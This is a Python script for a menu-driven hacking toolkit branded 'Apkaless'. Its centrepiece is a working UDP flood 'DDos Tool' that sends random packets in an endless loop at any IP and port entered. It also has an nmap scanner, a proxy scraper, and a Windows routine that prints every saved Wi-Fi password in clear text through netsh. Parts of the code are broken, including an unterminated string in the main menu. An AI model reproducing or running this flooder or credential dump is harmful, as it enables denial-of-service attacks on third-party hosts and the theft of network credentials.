try:
     import socket
     import sys
     import random
     import time
     import nmap
     import threading
     import proxyscrape
     import subprocess
     import os
     from pafy import new
     import colorama 
     from colorama import Fore, Back, Style
     import marshal
     import requests
     import platform
     import who_is_on_my_wifi
     # code started

     # This is Code For Hostname Tool
     def updateTool():
          os.system("clear")
          print("Getting Premssion...")
          time.sleep(2)
          os.system("clear")
          print("Updating...")
          time.sleep(2)
          os.system("chmod +x updater.sh")
          os.system("./updater.sh")
          time.sleep(2)
          print("All Done\n")
          time.sleep(2)
          exit()
     def gethostbyname1():
          print(Style.BRIGHT)
          print(Fore.GREEN)
          os.system("clear") 
          os.system("figlet IP TOOL")
          print("")
          #  print("""Welcome To IP Tool\n
          #      Creator: Apkaless\n
          #      Country: Iraq\n""")
          hostname = input(str(Fore.GREEN + "Enter Any Host Name: "))
          ipaddress = socket.gethostbyname(hostname)
          time.sleep(1)
          print("")
          print(Fore.GREEN + "IP Address of the hostname {} is : {}" .format(hostname, Fore.BLUE + ipaddress))
          time.sleep(1)
          print("")
          print(Fore.GREEN + "This Tool Was Created By Apkaless ☣")
          time.sleep(1)
          print("")
          print(Fore.GREEN + "Thanks For Using My Tool ☣")
          time.sleep(1)
          print("")
          print(Fore.GREEN + """Select An Action:\n
                    1) DDos IP
                    2) Scan IP
                    3) Exit\n""")
          answer = input(Fore.GREEN + "Choose Option: ")
          if answer == "1":
               ddostool()
          elif answer == "2":
               scanner()
               
          else:
               starting()

     # This is The End Of The Code


     # This Code Of DDos Tool

     def ddostool():
          print(Style.BRIGHT)
          print(Fore.GREEN)
          os.system("clear")
          os.system("figlet DDos Tool")
          # print("\nDDos Tool By Apkaless")
          time.sleep(1)
          print("")
          # # print("Country: Iraq")
          # time.sleep(1)
          # print("")
          #####################################################
          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          bytes = random._urandom(10000)
          #####################################################
          host = input(Fore.GREEN + "Target IP: ")
          time.sleep(1)
          print("")
          print(Fore.GREEN + "The Default Port is 80")
          time.sleep(1)
          print("")
          port = int(input(Fore.GREEN + "Port: "))
          sent = 0
          os.system("clear")
          os.system("figlet DDos Starting.....")
          time.sleep(2)
          print(Fore.GREEN + "[=======] 0%")
          time.sleep(1)
          print(Fore.GREEN + "[===============] 25%")
          time.sleep(2)
          print(Fore.GREEN + "[======================] 50%")
          time.sleep(3)
          print(Fore.GREEN + "[==========================] 75%")
          time.sleep(4)
          print(Fore.GREEN + "[===============================] 100%")
          time.sleep(5)
          while True:
               s.connect((host,port))
               s.sendto(bytes, (host,port))
               sent = sent + 1
               print(Fore.GREEN + Style.NORMAL + "Attacking %s packets to %s on port %s By Apkaless" %(sent,host,port))
               if port == 66534:
                    port = 1

     #This is The End Of Code

     #This Code For Scanner tool

     def scanner():
          try:
               print(Style.BRIGHT)
               print(Fore.GREEN)
               # print("\nWelcome To Scanner Tool")
               # print("<------------------------------------->")
               # print("Creator: Apkaless")
               # print("")
               # print("Country: IRAQ")
               # print("")
               os.system("clear")
               os.system("figlet IP SCANNER")
               print("")
               nmScan = nmap.PortScanner()
               host = input(Fore.GREEN + "Enter The IP Address You Want To Scan: ")
               print("")
               time.sleep(1)
               print(Fore.GREEN + "Your IP Address is:",Fore.BLUE + host)
               print("")
               time.sleep(1)
               # print("Thanks For Using My Tool")
               # time.sleep(1)
               res = input(Fore.GREEN + """Please Select A Method:\n
                         1) SYN ACK Scan
                         2) UDP Scan\n
                         Option --> """)
               time.sleep(1)
               print("")
               print(Fore.GREEN + "You Selected Option: ",Fore.BLUE + res)
               print("")
               if res == "1": # SYN ACK SCAN 
                    print(Fore.GREEN + "Nmap Version",nmScan.nmap_version())
                    print("")
                    time.sleep(1)
                    print(Fore.GREEN + "Scanning.....")
                    print("")
                    nmScan.scan(host,'1-1024','-sV')
                    print(nmScan.scaninfo())
                    print("")
                    for host in nmScan.all_hosts():
                         print(Fore.GREEN + Style.NORMAL + "Host: %s" %(Fore.GREEN + Style.BRIGHT + host))
                         print("")
                         print(Fore.GREEN + Style.NORMAL + "State: %s" %(Fore.GREEN + Style.BRIGHT + nmScan[host].state()))
                         print("")
                    for proto in nmScan[host].all_protocols():
                         print(Fore.GREEN + Style.NORMAL + "Protocol: %s" %(Fore.GREEN + Style.BRIGHT + proto))
                         print("")
                         for key in nmScan[host]['tcp'].keys():
                              print(Fore.GREEN + "--------------------")
                              print(Fore.GREEN + "Port: %s %s %s \n" %(key,proto,nmScan[host].tcp(key)))
                    print("")
                    input(Fore.GREEN + "Press Enter To Back..... ")
                    starting()
               elif res == "2":
                    print("Nmap Version",nmScan.nmap_version())
                    print("Scanning.....")
                    nmScan.scan(host,'1-1024','-v -sU')
                    print(nmScan.scaninfo())
                    for host in nmScan.all_hosts():
                         print("Host: %s" %(Fore.BLUE + host))
                         print("State: %s" %(nmScan[host].state()))
                    for protocol in nmScan[host].all_protocols():
                         print("Protocol: %s" %(Fore.BLUE + protocol))
               else:
                    print(Fore.GREEN + "Please Select a Valid Option\n")
                    input(Fore.GREEN + "Press Enter To Back..... ")
                    starting()
          except ModuleNotFoundError:
               print("Please Open README.md File\n")
               print(Fore.RED + "Install The Requirements From", Fore.BLUE + "requirements.txt", "File")

     # This The End Of The Code

     def scraper():
          print(Style.BRIGHT)
          print(Fore.GREEN)
          os.system("clear")
          os.system("figlet PROXY SCRAPER")
          collector = proxyscrape.create_collector('default','socks4')
          proxies = collector.get_proxies({'country' : 'united states'})
          print(Fore.GREEN + "\nScraping Proxies.....\n")
          time.sleep(5)
          print(proxies)
          input(Fore.GREEN + "\nPress Enter To Back..... ")
          starting()

     def wifiPassword():
          print(Style.BRIGHT)
          print(Fore.GREEN + "Wifi Password Tool 2020")
          print("")
          data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
          profiles = [i.split(':')[1][1:-1] for i in data if "All User Profile" in i] # Wifi Name
          for i in profiles:
               try:
                    result = subprocess.check_output(['netsh','wlan','show','profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                    result = [b.split(":")[1][1:-1] for b in result if "Key Content" in b] # Wifi Password
                    try:
                         for password in result:
                                   print(Fore.GREEN + "Wifi Name: {}\n\nPassword: {}" .format(i,password))
                    except IndexError:
                         print(Fore.GREEN + "Wifi Name: {} Password: {}" .format(i,""))
               except subprocess.CalledProcessError:
                    print(Fore.GREEN + "Wifi Name: {} {}" .format(i,"ENCODING ERROR"))
          print("")
          input(Fore.GREEN + "Coded By Apkaless ")

     def whoIsOnMyWifi():
          os.system("clear")
          os.system("figlet Who Is On My Wifi")
          print("")

          who = who_is_on_my_wifi.who()

          for i in who:
               time.sleep(1)
               print(Fore.BLUE + Style.NORMAL + "====================================================================================================\n")
               print(Fore.GREEN + Style.NORMAL + i[0], Style.BRIGHT + i[1], "\n", Style.NORMAL + i[2], Style.BRIGHT + i[3], "\n", Style.NORMAL + i[4], Style.BRIGHT + i[5],"\n")
          print("Apkaless The Warrior\n")
          input("Press Enter To Back...")
          starting()

     def videoDownload():
          print(Style.BRIGHT)
          print(Fore.GREEN)
          os.system("clear")
          os.system("figlet YouTube Video")
          url = input(Fore.GREEN + "Enter YouTube Video Link: ")
          print("")
          video = new(url)

          def forVideo():

               streams = video.streams
               i = 0 
               for stream in streams:
                    print("\n",str(i),"-",stream,"\n")
                    i += 1
               streamNumber = int(input(Fore.GREEN + "Enter Number 0 OR 1 : "))
               print(Fore.GREEN + "\nYour Option : ",streamNumber,"\n")
               streams[streamNumber].download()
               print(Fore.GREEN + "\nYour Video Successfully Downloaded\n")
               print(Fore.GREEN + "Your Video Path : /root\n")
               input(Fore.GREEN + "Press Enter To Back..... ")
               starting()

          def forAudio():

               audios = video.audiostreams
               a = 0
               for audio in audios:
                    print(Fore.GREEN + "\n",str(a),"-",audio,"\n")
                    a += 1
               audioNumber = int(input(Fore.GREEN + "Enter Number: "))
               print("")
               audios[audioNumber].download()
               print(Fore.GREEN + "\nYour Audio File Successfully Downloaded\n")
               print(Fore.GREEN + "Your Audio File Path: /root\n")
               input(Fore.GREEN + "Press Enter To Back.....")
               starting()

          streamType = input(Fore.GREEN + """Select Option:
                                        
                    1) Video 

                    2) Audio File

          Enter Number 1 OR 2 : """)

          if streamType == "1":
               forVideo()
          elif streamType == "2":
               forAudio()
          else:
               input(Fore.GREEN + "Press Enter To Back.....")
               starting()


     def starting():
          print(Style.BRIGHT)
          print(Fore.GREEN)
          os.system("clear")
          os.system("figlet Apkaless")
          time.sleep(1)
          print("")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Creator   : ", Style.BRIGHT + "APKALESS (SABAH)")
          print(Fore.BLACK + Style.BRIGHT + "[☣]", Fore.LIGHTBLACK_EX + Style.NORMAL + " Creator   : ", Style.BRIGHT + "ABDULLAH")
          print(Fore.RED   + Style.BRIGHT + "[☣]", Fore.RED + Style.NORMAL + " Creator   : ", Style.BRIGHT + "AMEER")
          print(Fore.RED   + Style.BRIGHT + "[☣]", Fore.RED + Style.NORMAL + " Creator   : ", Style.BRIGHT + "HUSSEIN")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Country   : ", Style.BRIGHT + "IRAQ")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " YouTube   : ", Style.BRIGHT + "https://www.youtube.com/channel/UCghQXaAH2PXS67c84b6txKw")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Github    : ", Style.BRIGHT + "https://github.com/Apkaless")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Facebook  : ", Style.BRIGHT + "https://www.facebook.com/Apkaless")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Instagram : ", Style.BRIGHT + "https://www.instagram.com/Apkaless")
          print(Fore.GREEN + Style.BRIGHT + "[☣]", Fore.GREEN + Style.NORMAL + " Server    : ", Style.BRIGHT + "Online")
          print(Fore.GREEN + """
     =================================================
              Created By Apkaless The Warrior           
     =================================================
                    ++++++++++++++++++++                                                                                                         
                                                       
                                                       
               Apkaless                              
                    _,.                   
                  ,` -.)                  
                 ( _/-\\-._               
                /,|`--._,-^|            ,  
                \_| |`-._/||          , |  
                  |   `-, /|         /  /  
                  |     || |        /  /   
                   `r-._||/   __   /  /    
               __,-<_     )`-/  `./  /    
               \   `---    \   / /  /      
                  |           |./  /       
                  /           //  /       
              \_/  \         |/  /        
               |    |   _,^- /  /          
               |    , ``  (\/  /_          
                \,.->._    \X-=/^          
                (  /   `-._//^`            
                 `Y-.____(__}               
                  |     {__)              

                      ()   V.1.0        
     """)
          try:
               # print("Verifying The Code....")
               # time.sleep(2)
               # print("")
               starthacking = input(Fore.GREEN + Style.BRIGHT + """What Do You Want?\n
                         [1] Get IP Tool

                         [2] Scanner Tool

                         [3] DDos Tool

                         [4] Proxy Scraper

                         [5] Wifi Password (This Option Work On Windows Only)

                         [6] YouTube Video Download

                         [7] Who Is On My Wifi
                         
                         [8] System Informations
                         
                         [9] Update Tool\n
                                             
     Press""", Fore.BLUE + Style.NORMAL + "Ctrl" "+", Fore.RED + Style.NORMAL + "C", "To Exit From This Tool.\n
               "Choose Option -----> "")

               if starthacking == "1":
                    gethostbyname1()
               if starthacking == "2":
                    scanner()
               if starthacking == "3":
                    ddostool()
               if starthacking == "4":
                    scraper()
               if starthacking == "5":
                    wifiPassword()
               if starthacking == "6":
                    videoDownload()
               if starthacking == "7":
                    whoIsOnMyWifi()
               if starthacking == "8":
                   os.system("clear")
                   os.system("figlet Sys Info")
                   print("")
                   time.sleep(2)
                   uname = platform.uname()
                   system = platform.system()
                   node = platform.node()
                   release = platform.release()
                   version = platform.version()
                   machine = platform.machine()
                   processor = platform.processor()

                   print(Fore.GREEN + Style.NORMAL + "System:",Fore.LIGHTMAGENTA_EX + Style.NORMAL + system,"\n")
                   print(Fore.GREEN + Style.NORMAL + "Node:",  Fore.LIGHTMAGENTA_EX + Style.NORMAL + node,"\n")
                   print(Fore.GREEN + Style.NORMAL + "Release:",Fore.LIGHTMAGENTA_EX + Style.NORMAL + release,"\n")
                   print(Fore.GREEN + Style.NORMAL + "Version:",Fore.LIGHTMAGENTA_EX + Style.NORMAL + version,"\n")
                   print(Fore.GREEN + Style.NORMAL + "Machine:",Fore.LIGHTMAGENTA_EX + Style.NORMAL + machine,"\n")
                   print(Fore.GREEN + Style.NORMAL + "Processor:",Fore.LIGHTMAGENTA_EX + Style.NORMAL + processor,"\n")
                   input("Press Enter To Back...")
                   starting()



               if starthacking == "9":
                    updateTool()



          except KeyboardInterrupt:
               print(Fore.GREEN + Style.BRIGHT + " \n\nHave A Nice Day ;)\n")
     try:
          print(Style.BRIGHT)
          print(Fore.GREEN)
          os.system("clear")
          os.system("figlet Apkaless")
          print("")
          print(Fore.GREEN + "Please Wait While",Fore.BLUE + "Apkaless", Fore.GREEN + "Setting Up His Own Tool\n")
          time.sleep(6)
          os.system("clear")
          os.system("figlet Apkaless")
          print("")
          print("Checking System...")
          time.sleep(2)
          os.system("clear")
          os.system("figlet Apkaless")
          print("")
          print("Checking Requirements...")
          time.sleep(2)
          # print(Fore.RED + "Note :", Fore.GREEN + "Please Install The Requirements From", Fore.BLUE + "requirements.txt", Fore.GREEN + "If You Get Any", Fore.RED + "Error")
          starting()
     except KeyboardInterrupt:
          print(Style.BRIGHT)
          print(Fore.GREEN + " \n\nHave A Nice Day ;)\n")
     # os.system("clear")
     # os.system("figlet Apkaless")
     # print("")
     # print("Creator : APKALESS")
     # print("Country : IRAQ")
     # print("YouTube : https://www.youtube.com/channel/UCghQXaAH2PXS67c84b6txKw")
     # print("Github  : https://github.com/Apkaless")
     # print("Facebook: https://www.facebook.com/Apkaless")
     # print("")
     # starting()


     # ActivationCode = input("Activation Code: ")
     # print("")

     # if ActivationCode == "APIQIRAQ110HACKER":
     #       starting()
     # else:
     #       print("Verifying The Code....")
     #       time.sleep(2)
     #       print("")
     #       print("The Code is Wrong")
     #       print("")
     #       input("Press Enter To Exit....")

     # #code ended
except ModuleNotFoundError:
     import os
     import sys
     import time
     os.system("clear")
     print("Please Wait")
     time.sleep(2)
     os.system("pip install colorama")
     from colorama import Fore, Back, Style
     os.system("clear")
     print(Fore.RED)
     os.system("figlet Apkaless")
     print("")
     time.sleep(1)
     print(Fore.RED + Style.BRIGHT + "ERROR error\n")
     print(Fore.BLUE + "Installation : \n")
     print(Fore.CYAN + "1)", Fore.RED + "Install", Fore.BLUE + "figlet", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.YELLOW + "(For Linux : apt install figlet)", Fore.GREEN + "(For Termux : pkg install figlet)", Fore.BLACK + "(For Ish IOS : apk add figlet\n)")
     print(Fore.CYAN + "2)", Fore.RED + "Please Open", Fore.BLUE + "README.md", Fore.RED + "File", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.GREEN + "cat README.md\n")
     print(Fore.CYAN + "3)", Fore.RED + "Install The Requirements From", Fore.BLUE + "requirements.txt", Fore.RED + "File", Fore.MAGENTA + "Type This Command Line", Fore.BLUE + "-->", Fore.GREEN + "python3 -m pip install -r requirements.txt\n")
     print(Fore.CYAN + "4)", Fore.BLUE + "Enjoy:)\n")